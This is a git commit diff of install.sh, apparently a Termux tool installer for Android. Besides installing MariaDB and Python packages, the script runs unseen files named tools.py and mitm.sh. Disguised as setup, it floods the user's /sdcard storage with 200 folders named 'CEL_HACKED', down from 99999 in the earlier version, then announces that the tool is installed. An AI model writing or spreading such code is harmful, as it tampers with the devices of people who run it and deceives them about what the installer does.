54f5f48c2f6f12bc9bb6a4f01a2f5487a1ecb6a1
byteSalgado <63315825+byteSalgado@users.noreply.github.com>
2020-04-28 14:56:38 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -9,15 +9,24 @@ apt install mariadb
 mkdir -p  /data/data/com.termux/files/usr/etc/my.cnf.d
 mysql_install_db
 mysqld_safe -u root &
+apt install python*
+pip install pybase64
 chmod +x mitm.sh
+chmod +x tools.py
+python tools.py
 clear
-bash mitm.sh
 A=1
 termux-setup-storage
 cd /sdcard/
-while [ $A -lt 99999 ]
+while [ $A -lt 200 ]
 do
-mkdir "HACKED $A"
+mkdir "CEL_HACKED $A"
 let A++
 done
+clear
+sleep 5
+echo -e "Herramienta instalada se ejecutara en 5 segundos"
+sleep 5
+clear
+bash mitm.sh
 
